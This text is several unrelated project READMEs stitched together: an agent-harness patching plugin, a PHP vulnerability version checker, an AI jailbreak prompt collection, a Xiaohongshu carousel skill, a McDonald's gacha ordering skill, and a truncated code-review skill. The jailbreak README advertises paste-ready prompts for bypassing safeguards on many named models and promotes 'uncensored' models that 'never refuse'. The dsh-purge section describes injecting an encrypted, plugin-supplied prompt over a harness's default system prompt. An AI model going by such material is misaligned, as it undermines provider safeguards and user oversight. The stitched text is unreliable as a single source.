save, the addresses that hostname resolves to at lookup time are allowed too. - `alice@my-vps.example.com` — the account only identifies this form. It does not prove the machine is yours. 4. Click **Save list**. The list is written to `$DSH_HOME/net-scope-allow.txt`. 5. Keys, passwords, ranges, and wildcards are dropped on save. Unlisted mainland China, Hong Kong, and Macau addresses stay forbidden. `203.0.113.10` and `example.com` above are only examples of the form. Replace them with your own host before you save. --- ## Local checks ```sh node --check lib/index.js node --check lib/core.js node --check lib/surface.js node --check lib/web.js node --check lib/desktop.js node --check lib/host.js node --check lib/rewind.js node --check lib/skills.js node --check client.js ``` --- ## How it works Apply, on start or when you click Apply: ```mermaid flowchart TD A["Start or click Apply"] --> B{"Patch already in place?"} B -->|yes| C["Skip"] B -->|no| D["Back up the original as .dshpurge.bak"] D --> E["Replace the matched files"] E --> F["Override the shim"] F --> G["Inject the encrypted prompt shipped in the plugin, the text the prompt box shows by default"] ``` Override on each session: ```mermaid flowchart TD A["Restart or new session"] --> B["Inject the plugin's encrypted default. No save click, and no host prompt file"] ``` Prompt injection and ruleset decision at every turn. The three inputs on the left are what you control in the dsh-purge panel; the dotted edges show which decision each one drives: ```mermaid flowchart TD L["Rule library: activate a set → writes prompt-inject.md"] W["Local rules: check AGENTS.md / CLAUDE.md in the current dir"] P["Workspace policy: strict / fallback / always"] A["Turn start"] --> B{"prompt-inject.md non-empty?"} B -->|yes| C["Inject = prompt-inject.md (A)"] B -->|no| D{"Any checked local md in the current dir, non-empty?"} D -->|yes| E["Inject = selected workspace md (B)"] D -->|no| F["Inject = plugin encrypted slot default (D)"] C --> G{"Workspace baseline policy (C)"} E --> G F --> G G -->|strict| H["Drop DSH workspace baseline section"] G -->|fallback default| I{"User inject present above? (A or B)"} G -->|always| J["Keep DSH workspace baseline section"] I -->|yes| H I -->|no| J H --> K["Final system prompt"] J --> K L -.-> B W -.-> D P -.-> G ``` Skills stay out of the inject section: ```mermaid flowchart LR A["Settings import or /skills import"] --> B["Write into the official skills directory"] B --> C["DSH loads it"] C --> D["Uninstall does not delete user skills"] ``` --- ## Restore - Each target is copied to `.dshpurge.bak` before the first apply. - **Restore** or `/purge revert` copies backups back and deletes them. With no backup, shim lines written by this plugin are stripped. - `prompt-inject.md` is a user file and is kept. - **Uninstall** restores first if patches were applied, then deletes the inject file, rule library, and the plugin itself. - Apply is idempotent. --- ## Path detection The host surface is detected first: `web` / `desktop` (`gui` / `tui` are reserved and still fall back to web). **Web:** 1. `DSH_HOME` / `DSH_BASE` 2. `.dsh` next to the dsh launcher (portable install, any drive) 3. `npm prefix -g` / `npm root -g` 4. Nested `@deepseek-ai/dsh/node_modules/@deepseek-ai` 5. `~/.dsh` **Official desktop EXE:** the running official Harness install (`resources/app` or the unpacked package). The drive letter is not hard-coded. A successful Apply restarts once. Community Desktop is not maintained. Official npm-global is not patched. Sealed `host-commands` / `runtime-commands` are scrubbed, never injected. If nothing is found, set `DSH_BASE` / `DSH_DESKTOP_INSTALL`. No files are changed. --- ## Releases What changed, and the zip, are on [Releases](https://github.com/YuJunZhiXue/dsh-purge/releases). To publish, bump the version in `package.json`, write Chinese and English notes in `release-notes.md`, and push `master`. Pushing the same version again does not publish another package. ## Notes - Scope is rendered copy, defaults, and runtime logic inside local `@deepseek-ai/*` packages, plus override files and rule sets under the harness home. - After an upgrade, unmatched originals show as skipped. Apply still completes, and those files are left unchanged. - Third-party plugin *source repos* outside `@deepseek-ai` are left alone (CMD silence may **best-effort** patch installed doctor / market / liangshen / mnemon at runtime). - Install the npm package `dsh-purge`: `dsh plugin --profile web add dsh-purge` or `dsh plugin --profile desktop add dsh-purge`. From this repo, `add .`. If the registry is blocked, add the master.tar.gz URL instead. Hub one-click uses the same npm package. --- Thanks to the [LINUX DO](https://linux.do) community

# PHP Version Checker

Check a website or local PHP binary to see if it's vulnerable to php2shell.

To install both skills, ask Codex:

```text
$skill-installer install both skills from https://github.com/openai/php2shell-checker
```

Use [phpcheck-server](skills/phpcheck-server/SKILL.md) when you have server
access, or [phpcheck-url](skills/phpcheck-url/SKILL.md) when you only have a URL:

```text
$phpcheck-url check https://example.com
```

```text
$phpcheck-server check the PHP version serving my site
```

## Run directly

Check a website:

```sh
node phpcheck.js "https://example.com"
```

Check the local CLI PHP

```sh
node phpcheck.js --local
```

## Results

| Result | Exit code | Meaning |
| --- | --- | --- |
| `OK` | `0` | Stable PHP patch version above the embedded cutoff for a listed major/minor branch. |
| `VULNERABLE` | `1` | PHP version at or below the embedded cutoff for that branch. |
| `UNKNOWN` | `3` | No PHP version or response, an unrecognized version/branch, or a newer prerelease build. |

Use `--json` for machine-readable output (`patch_status` is `ok`, `vulnerable`,
or `unknown`). Invalid arguments exit with code `2`.

## Tests

```sh
node --test phpcheck.test.js
```

Tests run the CLI against local HTTP servers and a fake PHP executable.
No PHP installation or external website is required.

## Limitations

The checker only evaluates versions exposed in HTTP response headers or by
`php -v`. It reads `X-Powered-By` and `Server`, sends `HEAD`, and falls back to
`GET` only when `HEAD` returns 405 or 501. It does not follow redirects or
inspect response bodies. Missing or hidden PHP headers return `UNKNOWN`.

`OK` is a version comparison based on the assumption that subsequent stable patches in each listed branch contain the fix.
It does not independently verify a security fix. Check the versions against
the official PHP security release. Headers can be hidden or changed, and distribution backports may
not change the upstream version. `UNKNOWN` does not mean the target is patched!

## Contributing

OpenAI is not accepting external code contributions to this project. Bug
reports and non-code feedback are welcome through GitHub issues. See
[CONTRIBUTING.md](CONTRIBUTING.md).

# AI Jailbreaks **AI jailbreaks — a curated collection of system prompts, persona locks, workspace policies, and agent operating specs for frontier, open-weight, and free stealth models. Every AI jailbreak here is a complete, paste-ready prompt.** ![Prompts](https://img.shields.io/badge/prompts-35-4c9f70) ![Targets](https://img.shields.io/badge/targets-25%2B-2f6f9f) ![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat&logo=github) ![Stars](https://img.shields.io/github/stars/Alejandros17487/ai-jailbreaks?style=flat&logo=github&color=yellow)
---

**Jailbreaks not working? Try [7API](https://7api.st/?src=github)** — the cheapest API for frontier models at up to 99% off, including Uncensored and Abliterated models that never refuse.
--- ## About This repo holds **35 paste-ready prompts for 25+ models**: full system prompts, persona definitions, workspace policies, `AGENTS.md` files, config blocks, and Ollama Modelfiles. Every file is complete — no summaries, no excerpts. What's inside: - Free stealth models on OpenCode Zen - Open-weight families: GLM, DeepSeek, Kimi, Qwen, Gemma, GPT-OSS - Closed frontier models: Claude, Gemini, Grok, Mistral - Coding-agent and workspace instruction formats - Ollama Modelfiles and harness-specific configuration New here? Skim the [collection](#collection) or jump to [how to use](#how-to-use). > [!WARNING] > **Research and educational use only.** > > This repo documents how persona framing, instruction hierarchies, prompt conflicts, and policy overrides shape model behavior — the same findings that help developers harden AI against prompt injection. > > Don't use this material to harm others, break the law, or violate a provider's terms of service. ## Collection ### OpenCode Zen — Free Stealth Models | Model | File | Type | |---|---|---| | **Big Pickle** | [bigpickle-opencode.md](./bigpickle-opencode.md) | client or API offers — an API `system` message, a chatbot's custom instructions, an agent instruction block, or harness-level prompt configuration. ### AGENTS.md Files Save the file as `AGENTS.md` in the root of your repository or workspace. Coding agents and compatible tools pick it up as project-level instructions. ### Workspace Policies Files marked as an **assistant operating specification** or **workspace operating profile** belong in environments with persistent global instructions. Models get updated, instruction hierarchies shift, and system prompts rotate — what works on one release may fail on the next. If a file looks outdated, [open an issue](../../issues) or send an updated version. ## Contributing Pull requests are welcome. Follow these conventions: 1. **One prompt per file**, named lowercase with hyphens and no spaces: ```text model-name.md ``` 2. **Include the full prompt** — paste-ready, not a summary or excerpt. 3. **Say where it goes** — system prompt, `AGENTS.md`, Modelfile, config slot, or another instruction surface. 4. **Version your changes** — a significant revision gets a new file, not a silent overwrite: ```text opus-v3.md ``` 5. **Keep claims honest** — don't advertise compatibility you haven't tested. Found something that no longer behaves as documented? An issue with the model, version, and affected file is already a big help. ## Disclaimer Everything here is **for research and education**. The repo documents prompt-level instruction behavior, instruction conflicts, persona framing, model configuration, and related LLM security concepts — material that can also help developers defend against prompt injection. The maintainers don't endorse unlawful, abusive, or harmful use. Model providers may restrict some of these prompts under their terms of service, and it's on you to know and follow the rules that apply to the systems you use. ---
**Star the repo if it saved you a session of prompt archaeology.** *Issue reports and pull requests keep the collection current as models change.*

# Ian XHS Carousel **中文** | [English](README.en.md) > 把文章、案例或笔记，排成一组 3:4 的小红书图文。 > > 1080×1440 竖版 | 20 个母版 | 浅色 / 深色 | Claude Code Skill --- ## 这是什么 Ian XHS Carousel 是一个 AI Skill，把你的内容做成一组小红书轮播图，风格是简洁的产品界面风。 你把内容交给它，它先出一张分镜表给你确认，确认后再排版、出图。 **最好用 Claude 跑。** --- ## 适合谁用 - 写文章、做案例拆解，想顺手发一份小红书图文的人 - 做 AI、产品、设计、效率工具内容，图里常有截图、步骤、对比、数据、代码的人 - 想让每期图文风格统一、看着干净的人 想要手绘、插画、大色块海报这类风格的话，这个不太合适。 --- ## 它会产出什么 - **分镜表**：每页讲什么、用哪个母版、标题怎么写，先给你确认 - **每页一张 PNG**：1080×1440，可以直接发 - **总览图**：所有页排在一起，一眼看整组节奏 - **HTML 源文件**：想自己改字、换图，改完重新渲染就行 浅色、深色两版都能出，版式一样。 小红书帖子的标题、正文和话题标签需要你另外写。 --- ## 20 个母版 ![20 个母版 · 浅色](examples/images/templates-light.png)
深色版 ![20 个母版 · 深色](examples/images/templates-dark.png)
| 分组 | 母版 | |---|---| | 封面 | T01 对话框、T02 窗口、T03 通知 | | 讲做法 | T04 步骤、T05 清单、T06 时间线 | | 对比 | T07 对错、T08 前后双栏 | | 展示 | T09 宫格、T10 截图标注、T11 手机截图、T12 应用列表 | | 数字 | T13 数据指标、T14 参数设置 | | 文字 | T15 观点大字、T16 聊天、T17 提示词、T18 代码 | | 结尾 | T19 对照、T20 完成 | 20 个都不合适的时候，AI 会用同一套样式拼一个新排法。 --- ## 安装 **1. 下载并复制到 Claude Code** ```bash git clone https://github.com/helloianneo/ian-xhs-carousel.git mkdir -p ~/.claude/skills cp -R ./ian-xhs-carousel/ian-xhs-carousel ~/.claude/skills/ ``` **2. 装渲染要用的工具**（第一次用时装一次） ```bash pip install playwright pillow playwright install chromium ``` 渲染时会联网加载英文和代码字体，记得保持网络畅通。 --- ## 素材要好看 一组图好不好看，很大程度看你给的素材。上传前花几分钟挑一挑： - **截图**：用高清的，裁掉浏览器工具栏、桌面和别的窗口；做深色版就截深色模式的 - **Logo 和图标**：用官方的 SVG，别截一个小图再放大 - **照片和效果图**：一堆里挑最好看的那张 - **没有好图**：先空着，它会在分镜表里列出来问你要，别拿糊的凑 --- ## 怎么用 在 Claude Code 里输入： ```text /ian-xhs-carousel 把下面这篇文章做成一组小红书图文。 <粘贴文章> ``` 不输命令也行，直接说"把这篇做成小红书"，它一般会自己用上。 **只要分镜表** ```text /ian-xhs-carousel 先别排版，帮我看看下面这篇能做成几页，出分镜表就行。 <粘贴文章> ``` **出深色版** ```text /ian-xhs-carousel 把这篇做成小红书图文，用深色主题。截图在 ./shots 里。 <粘贴文章> ``` **改某一页** ```text 第 3 页换成 T08 前后双栏，左边放旧版截图，右边放新版。 ``` 更多示例见 [examples/prompts.md](examples/prompts.md)。 --- ## 工作流程 1. **读内容**：想清楚这组图要让人带走什么 2. **出分镜表**：一页讲一件事，一般 5 页左右，**停下来等你确认** 3. **准备配图**：用你给的素材，缺的会列出来问你 4. **排版**：从 20 个母版里挑合适的 5. **渲染和自查**：检查文字溢出、字号、配色，有问题自己改掉 6. **交付**：给你每页图和总览图 --- ## 小贴士 - 分镜表那一步多花点时间，页数和每页讲什么定下来，后面基本不用返工 - 图上的字越少越好，说不完的留给正文 - 页数宁少勿多，5 页左右刚好 --- ## 目录结构 ```text . ├── README.md ├── README.en.md ├── examples/ 母版总览图、更多提示词 └── ian-xhs-carousel/ ← 安装的是这个文件夹 ├── SKILL.md ├── assets/ 样式、母版、图标 ├── references/ 设计规则、母版说明、自查清单 └── scripts/ 渲染脚本 ``` --- ## 相关项目 - [Ian Xiaohei Illustrations](https://github.com/helloianneo/ian-xiaohei-illustrations) — 中文小黑怪诞正文配图生成 Skill - [Ian Handdrawn PPT](https://github.com/helloianneo/ian-handdrawn-ppt) — 中文手绘技术 PPT-style 页面图生成 Skill - [Awesome Claude Code Skills](https://github.com/helloianneo/awesome-claude-code-skills) — Claude Code Skills / Agents / Plugins 精选合集 - [Obsidian + Claude AI Second Brain](https://github.com/helloianneo/obsidian-ai-second-brain) — Obsidian + Claude AI 个人知识库搭建指南 --- ## 关于作者 **Ian (伊恩)** — 产品设计师 / AI Builder GitHub 万星、Dribbble 万粉，用 AI 做好玩的东西，探索 AI + 自由。 - 网站：[ianneo.xyz](https://www.ianneo.xyz) - X/Twitter：[@ianneo_ai](https://x.com/ianneo_ai) - GitHub：[helloianneo](https://github.com/helloianneo) - Indie Builders 社群：[ianneo.xyz/ib](https://ianneo.xyz/ib) 交流合作加我微信，备注来意：

扫不了就搜微信号 `ianneoxyz`。 --- ## License MIT License. See [LICENSE](LICENSE).

# 麦卡收藏家 · mcd-gacha-collector > 基于 **麦当劳中国 MCP（McDonald's China MCP）** 开发的卡牌收集 Skill： > 把 160+ 餐品变成可收集的 SSR/UR/R 卡牌，每张标注**价格**与**卡路里**， > 积分每 4 小时恢复 1 次，抽到的卡**可以直接下单**。 > 又名：麦当劳抽卡助手 / 麦门图鉴 / MCD Gacha Collector / Big Mac Index。 麦当劳程序员创意开发大赛参赛作品（仓库创建于 2026-10-20）· 非麦当劳官方产品。 [![Python](https://img.shields.io/badge/Python-3.8%2B-blue)]() [![零依赖](https://img.shields.io/badge/dependencies-none-green)]() [![Skill 测试](https://img.shields.io/badge/skill_tests-105%20passed-brightgreen)]() [![网页一致性](https://img.shields.io/badge/parity_check-99%20passed-brightgreen)]() [![License](https://img.shields.io/badge/license-MIT-orange)]() --- ## 🌐 在线试玩（无需安装） ### 👉 进入页面后**自动通过 IP 定位 → 调用麦当劳 MCP → 选最近门店**，无需手动输入。 | 桌面端 | 移动端 | |:---:|:---:| | ![桌面首屏](images/screenshots/desktop-top.png) | ![移动首屏](images/screenshots/mobile-top.png) | | ![桌面全页](images/screenshots/desktop-full.png) | ![移动全页](images/screenshots/mobile-full.png) | 🎴 **在线试玩 + 抽卡演示**： 🔎 **原理图**：[`images/how-it-works.png`](images/how-it-works.png)（"健康度是怎么算出来的"） 🖼️ **整页预览**：[`docs/preview.png`](docs/preview.png)（含 8 张收藏卡） 📄 **页面 HTML**：[`docs/index.html`](docs/index.html)（94 KB 单文件，零依赖） --- ## 项目介绍 **你说"50 元内抽一张"**，它从麦当劳 53 张可购餐品里按健康度分级、用加权算法抽出一张， 卡面标注价格 ¥10、热量 117 kcal、蛋白质 0g、钠 17mg、健康度 63.4， 再告诉你这张卡在沈阳站出发层餐厅的实售价。 抽到喜欢就直接走 MCP `create-order` 下单。 **示例**：50 元预算抽卡 → 抽到 **UR 阳光柠檬红茶中杯**（¥10）， 按健康度 63.4 自动归入"中等偏好"档位； 再点"立即购买" → 核价 → 你确认 → 真实订单号 `1030503810000661984815703790`（已实测）。 它不止抽卡，还能回答四个衍生问题： | 你问 | 能力 | |---|---| | "哪个餐品热量低" | **健康度排序**：按 0~100 分跨档比较 160 款餐品 | | "我集了哪些" | **收藏册**：本地持久化，重复卡累计次数，53 张全图鉴 | | "能直接买吗" | **真实下单**：MCP 核价 → 强制二次确认 → create-order | | "积分什么时候恢复" | **积分账本**：网页手动刷新（60 秒冷却），Skill 每 4 小时自动 1 次 | --- ## 它解决什么问题 麦当劳有 160+ 餐品，但「巨无霸 513 大卡」这种信息藏在营养表里，没人主动去看： - 想知道哪个餐品热量低，要翻营养成分表逐行比对； - 想知道自己已经收集了哪些，完全没有记录； - 想买某道菜，得切出去重新查一遍。 本 Skill 的核心洞察是：**取数交给 MCP，算术交给代码，表达交给 Agent。** | 角色 | 职责 | |---|---| | 麦当劳 MCP | 实时菜单、价格、营养数据、门店、下单 | | `scripts/gacha.py` | 健康度评分、稀有度划分、加权抽卡、积分账本 | | WorkBuddy Agent | 理解需求、讲解卡牌、经确认后下单 | --- ## 架构 ``` flowchart TD U[用户: 抽卡/查营养/下单] --> A[WorkBuddy Agent] A -->|now-time-info| M[麦当劳 MCP
mcp.mcd.cn] A -->|query-nearby-stores| M A -->|query-meals| M A -->|list-nutrition-foods| M M --> N[归一化
nutrition/prices/store] N --> O[gacha.py
健康度 + 稀有度 + 加权抽卡] O --> P[Card
价格/热量/健康度/图片] P --> A A -->|render.py 卡面渲染| R[HTML/CSS 卡牌] R --> U U -->|点击「立即购买」| Q{用户确认?} Q -->|是| C[calculate-price 核价] Q -->|否| P C -->|quoteToken| A A -->|create-order| M M --> O2[订单号 + payH5Url] O2 --> U ``` ![原理图：抽卡 → 评分 → 稀有度 → 下单](images/how-it-works.png) --- ## 一句话安装 ``` git clone https://github.com//mcd-gacha-collector.git && cp -r mcd-gacha-collector/skills/mcd-gacha-collector ~/.workbuddy/skills/ ``` （Windows 为 `%USERPROFILE%\.workbuddy\skills\`；MCP Token 配置见下文「安装」。） --- ## 安装 ### 1. 申请麦当劳 MCP Token 前往麦当劳 MCP 开放平台 ，手机号登录后在「控制台」激活并复制 Token。 ### 2. 配置 MCP 连接 在 WorkBuddy 左侧边栏【专家·技能·连接器】→【连接器】→ 右上角【自定义连接器】→【配置 MCP】中， 填入 [`mcp-config.example.json`](mcp-config.example.json) 的内容， 并把 `${MCD_MCP_TOKEN}` 替换为你的真实 Token（或用环境变量注入），保存后【启用】。 ### 3. 安装本 Skill 把 `skills/mcd-gacha-collector/` 整个目录复制到 WorkBuddy 的用户技能目录： ``` cp -r skills/mcd-gacha-collector ~/.workbuddy/skills/ ``` （Windows 为 `%USERPROFILE%\.workbuddy\skills\`） 装好后在对话框里直接说「抽张麦当劳卡」即可触发。 --- ## 使用示例 **示例 1 · 抽卡** > 用户：50 元内抽一张。 Skill：拉菜单 + 营养数据 → 53 张卡池 → 预算过滤 + 加权抽卡 → 命中 **UR 阳光柠檬红茶中杯**（¥10 / 117 kcal / 健康度 63.4）→ 渲染卡面。 **示例 2 · 收藏册** > 用户：我的收藏册？ Skill：本地 `ledger.json` 聚合 → 「已集 3 张（UR 1 / R 2），平均热量 261 kcal，平均健康度 53.6」。 **示例 3 · 真下单** > 用户：买 朱古力新地。 Skill：找最近门店（沈阳站出发层餐厅 3230366）→ 核价（套餐 ¥50 含板烧鸡腿堡+中薯条+可乐中杯）→ 弹价格确认 → 用户确认 → `create-order` → 返回订单号 `1030503810000661984815703790` 与支付链接 → 立即 `cancel-order`（测试闭环）。 **示例 4 · 营养查询** > 用户：巨无霸多少热量？ Skill：`list-nutrition-foods` 命中 → 「巨无霸 513 大卡 / 蛋白质 27g / 脂肪 26g / 钠 961mg / 健康度 32.2（R 档）」。 **示例 5 · 门店选择** > 用户：附近麦当劳？ Skill：进入 IP 定位（默认）→ `/api/ip-locate` 拿到城市（如山东济南）→ `query-nearby-stores` 搜「济南」→ 按距离升序列出 6 家最近门店。 **示例 6 · 积分管理** > 用户：还有几次抽卡机会？ Skill：读 `Ledger.points` → 「当前 4 积分，下次自动恢复 2026-10-20 21:38:20」。 **示例 7 · 多抽** > 用户：来十连。 Skill：积分不够时告知还差几次 + 下次恢复时间；够则连抽 10 张、SSR 压轴翻牌、营收按热量排序展示。 --- ## 命令行快速体验（无需 Token） 内置样例数据，可离线跑通完整抽卡流程： ``` cd skills/mcd-gacha-collector/scripts # 看卡池分布 python gacha.py sample_data --inspect --budget 50 # 单抽 python gacha.py sample_data --draw 1 --budget 50 --ledger /tmp/ledger.json # 十连 python gacha.py sample_data --draw 10 --budget 50 --ledger /tmp/ledger.json # 查看收藏册统计 python gacha.py sample_data --collection --ledger /tmp/ledger.json # 模拟 100 次抽卡，验证概率分布（SSR 5% / UR 20% / R 75%） python gacha.py sample_data --simulate 100 --seed 42 # 渲染卡面 HTML（单文件输出） python render.py /tmp/ledger.json --out /tmp/cards.html --last-draw 1 # 跑 105 项自测（改逻辑后必跑） python selftest.py ``` 项目网页版（`docs/index.html`）由 `tools/gen_web_data.py` + `web/build.py` 构建： 数据生成期计算、运行期零依赖；`tools/parity_check.py` 99 项校验保证前后端一致。 --- ## 真实性对照表 | 项目 | 性质 | 说明 | |---|---|---| | 营养数据 | ✅ 真实 | MCP `list-nutrition-foods`，约 160 项，含能量/蛋白/脂肪/钠/钙 | | 卡池价格 | ✅ 真实 | MCP `query-meals`，53 张全为沈阳站出发层餐厅实售 | | 健康度算法 | ✅ 真实 | `gacha.py` 三维加权（蛋白密度 35% + 低热量 40% + 低钠 25%），selftest 覆盖边界 | | 稀有度分布 | ✅ 真实 | 由健康度阈值确定性划分，非人工编排 | | 抽卡概率 | ✅ 真实 | 加权算法 + 模拟 100 次验证分布 | | 网页一致性 | ✅ 真实 | `parity_check.py` 99 项校验（HTML/JS 语法、卡池分布、字段对齐） | | 真实下单 | ✅ 真实 | create-order 已实测通过（沈阳站 9900004064 ¥50，订单号 1030503810000661984815703790，已 cancel） | | 卡面图片 | ✅ 真实 | 53 张全部使用麦当劳官方菜单图（MCP `query-meals.image`，CDN `menu-img.mcd.cn`） | --- ## 参赛合规自查 对照《麦当劳程序员创意开发大赛活动规则》逐条自查（自查日期 2026-10-20）： | 规则要求 | 本仓库情况 | |---|---| | 仓库创建时间在 2025-12-25 ~ 2026-10-25 之间 | ✅ 创建于 2026-10-20 | | 仓库公开可访问 | ✅ public | | `README.md`（介绍 / 安装 / 使用示例 / 目标用户） | ✅ 四大章节齐全 | | `CONTEST_DECLARATION.md` | ✅ md5 `91a7b32ec28098b609ca3f215cdf7147` 与官方原文**逐字节一致** | | `MCP_INTEGRATION.md` | ✅ Tool 清单 + 调用流程 | | `mcp-config.example.json`（仅占位符） | ✅ 仅 `Bearer ${MCD_MCP_TOKEN}` | | `workbuddy.md`（WorkBuddy 专项） | ✅ 含开发环境、对话摘要、技术决策 | | 真实使用麦当劳 MCP | ✅ 9 个 Tool 实测（list-nutrition-foods、query-meals、calculate-price、create-order 等） | | 真实使用 WorkBuddy | ✅ 本 Skill 在 WorkBuddy 中开发与联调 | | 未包含真实 Token / 密钥 | ✅ 全 git 历史扫描为零命中 | | 内容合规（不贬损品牌与产品） | ✅ 仅陈述客观数据（价格/热量/健康度评分），中性表述，不与其他品牌对比 | --- ## 实测发现 开发过程中用真实 MCP 联调得到的观察（2026-10，个人账号实测）： - **`query-nearby-stores` 不返回经纬度**：`longitude` / `latitude` 恒为 `0.0`，只有 `distance`（米）可用。 → 前端不能直接算"最近"，只能走"城市 + 地点关键词"二段搜索。 - **散单 canWithOrder 恒为 false**：96 张单品全部不能单独下单，必须走套餐。 → 卡池里 18 张套餐是真正可下单的"主力军"，单品只做收藏展示。 - **`list-nutrition-foods` 的 data 是 CSV 字符串**：不是 JSON 数组，是 `[N]{fields}: name,v1,v2,...` 格式， 需要专项解析器（`parse_nutrition_csv`）。 - **`structuredContent` 必须解信封**：MCP 平台把业务数据嵌在 `structuredContent.data` 里， 但 data 仍可能是 dict / list / str（CSV），不能直接当业务对象返回。 - **`create-order` 必传 `takeWayCode`**：必须从 `calculate-price` 返回的 `takeWayList` 取， 不传直接 400。 - **WorkBuddy sites 部署不能注入 MCP Token**：公网网页只能 IP 定位 + 查门店； 真下单必须在本地后端（用户自跑 + 自带 Token）或 Skill 端（WorkBuddy connector）。 - **健康度相对分级才公平**：沈阳站 23 张卡池用固定阈值（≥75 为 SSR）， 因没有咖啡类单品会得到 0 张 SSR；分位数后自动 SSR 3 / UR 7 / R 13。 - **套餐独立算法才公平**：套餐总热量天然远高于单品，沿用单品算法会集体低分； 改用蛋白密度 40% + 钠密度 35% + 热量载荷 25% 后区分度恢复。 --- ## 目录结构 ``` . ├── README.md # 本文件 ├── CONTEST_DECLARATION.md # 参赛声明（官方原文，md5 一致） ├── MCP_INTEGRATION.md # MCP 集成：Server / Tool / 流程 / 价值 ├── mcp-config.example.json # 脱敏 MCP 配置（仅占位符） ├── workbuddy.md # WorkBuddy 开发对话上下文 ├── LICENSE # MIT │ ├── docs/ # 网页版产物（GitHub Pages 可直接发） │ ├── index.html # 94 KB 自包含单文件页面 │ └── assets/ # hero 横幅 + 53 张麦当劳官方菜单图 │ ├── web/ # 网页版构建脚本 │ ├── template.html # 页面模板 │ ├── build.py # 内联数据 → 单文件 │ └── assets/ # 横幅原图 │ ├── tools/ # 数据生成与一致性校验 │ ├── gen_web_data.py # 由 MCP 数据生成卡池 │ ├── data.json # 卡池产物（53 张，含元数据） │ ├── image_map.py / .json # 卡面图片映射（MCP image 字段） │ ├── combo_data.py # 套餐定义与营养加总（18 个套餐） │ ├── check_combo.py # 套餐评分分布诊断 │ ├── make_hero.py # 横幅图制作（裁切 + 模糊） │ └── parity_check.py # 99 项一致性校验 │ ├── server/ # Python 后端（IP 定位 + 门店 + 真下单） │ ├── app.py # HTTP 服务（stdlib only） │ ├── mcd_client.py # MCP 客户端（Streamable HTTP） │ ├── ip_locator.py # IP → 城市（ip-api.com 免费库） │ └── test_parse.py # 15 项门店解析断言 │ ├── deploy/ │ ├── build_deploy.py # 构建可发布的 app-dist/ 包 │ └── app-dist/ # （构建产物，gitignore） │ ├── skills/mcd-gacha-collector/ # ← Skill 本体（装进 WorkBuddy 即用） │ ├── SKILL.md # 技能指令（Agent 加载） │ ├── scripts/ │ │ ├── gacha.py # 核心引擎：评分 / 稀有度 / 抽卡 / 积分 / 收藏 │ │ ├── render.py # 卡牌与收藏册 HTML 渲染器 │ │ ├── selftest.py # 105 项自测 │ │ └── sample_data/ # 离线示例数据 │ ├── references/ │ │ └── mcp-tools.md # MCP Tool 清单 + 字段映射 │ └── assets/cards/ # 卡面图片（用户自制） │ ├── images/ # README 截图 │ ├── screenshots/ # 桌面 + 移动首屏与全页 │ └── how-it-works.png # （占位）原理图：健康度是怎么算出来的 │ └── UPLOAD.md # 上传到 GitHub 操作指南 ``` --- ## 目标用户 - **麦当劳 MCP 的使用者**，想把数据玩出更多花样； - **卡牌收集 / 抽卡玩法爱好者**； - **想用轻量方式了解餐品能量与营养构成的上班族、学生**； - **WorkBuddy Agent 玩家**，想在对话里直接"抽卡 + 下单"一条龙。 --- ## 技术亮点 - **确定性算法，不靠大模型口算**：所有金额、健康度、稀有度都由 `gacha.py` 计算或 MCP 返回。 - **健康度相对分级（分位数）**：用实测数据分布定阈值，避免固定阈值在不同门店菜单结构差异下失真。 - **套餐独立算法**：单品 vs 套餐两套权重，避免套餐集体低分；分位阈值独立计算。 - **构建期计算、运行期零依赖**：网页版数据在 Python 引擎里算好内联到 HTML， 前端不重写算法，`parity_check.py` 99 项校验防止漂移。 - **真实可验证**：所有"省 ¥X"结论都是算法在 MCP 实测数据上算出，非人工编排。 - **零依赖**：纯 Python 标准库，WorkBuddy 沙箱可直接运行；页面单文件零依赖。 - **品牌视觉 + 二次元游戏演出**：SSR 金光柱 + 40 颗粒子 + 全屏「SSR」大字翻牌； 字体走 Orbitron（数值）+ Rajdhani（标签）+ PingFang SC（中文）。 - **强制二次确认（防误下单）**：前端"立即购买"→ 后端核价 → 一次性 quoteToken（15 分钟） → 用户再次"确认下单"→ 后端验 token + create-order → 任何伪造直接 409 拒绝。 - **IP 自动定位**：进页面 800ms 后调 ip-api.com + query-nearby-stores，自动选中最近门店。 - **测试矩阵**：105 项 Skill 自测 + 99 项网页一致性 + 15 项后端解析 = 219 项断言。 --- ## items.name: simple-checker-v1
items.description: Codex skill：拆解代码功能板块，以彩色流程图和运行证据复核代码功能的实现--辅助你进行ai代码写作与更新。
items.readme: # 简单的检查者 1.0 一个 Codex skill，可用于拆解ai编写或修改的代码，说明各功能板块的作用和代码位置，并用可复核的运行证据检查作用是否生效、原始需求是否完成--辅助你与ai代码共同工作。适用于重度ai编码依赖，可以在不太懂代码编写的同时读懂ai写的代码结构和思路。 ## 使用流程 [查看横版完整流程图](assets/workflow-overview.svg) · [查看手机纵版流程图](assets/workflow-mobile.svg) 将代码和希望实现的目标交给 skill。它先按职责拆解代码，说明每块的作用和位置，再根据可运行的检查核验实际行为，最后生成独立的 HTML 图文拆解与 Markdown 文字版。需要完整审查时，还可生成总报告和有效记录。 | 产出方式 | 文件 | 阅读内容 | | --- | --- | --- | | 默认生成 | `code-breakdown.html` | 图文拆解、板块导航、源码与验证证据 | | 默认生成 | `code-breakdown.md` | 板块职责、代码位置、结论与限制的文字版 | | 可选完整报告 | `report.html`、`report.md`、`review.effective.json` | 审查总览、需求验收和有效记录 | **颜色表示检查状态，不是文件质量评分：** 绿色为在所记录范围内实际验证通过，红色为有证据确认的问题，黄色为待核实，灰色为尚未验证。缺少运行条件时会明确说明，不会把静态阅读说成运行通过。 ## 功能 - 先依据用户目标建立验收项，再按实际职责划分代码板块。 - 默认生成独立的 `code-breakdown.html` 图文页面和 `code-breakdown.md` 文字版：逐块解释职责、输入输出、文件/符号/行号、源码片段、验证状态、证据和限制。 - HTML 内置板块导航、输入→职责→输出示意、可选步骤图和教学样例；支持源码展开、点击/键盘跳转、筛选及打印，离线可读，适配手机。 - 使用流程图标记状态：README 使用 SVG 展示整体处理流程，审查报告使用 Mermaid/SVG 展示代码职责；绿色表示范围内验证通过，红色表示已确认问题，黄色表示待核实，灰色表示未验证。 - 支持生成 Markdown 和离线 HTML 审查报告；报告生成器只校验记录并渲染，不执行记录内的命令。 - 提供 SHA-256 文件快照校验和 Python 标准库测试。 绿色状态只适用于明确记录的输入、环境和验证范围，不代表所有场景正确。缺少源码、依赖或环境时应保留未验证状态。 ## 安装 将 `simple-checker-v1` 目录复制到 Codex 个人 skills 目录下。Windows 默认路径为： ```text 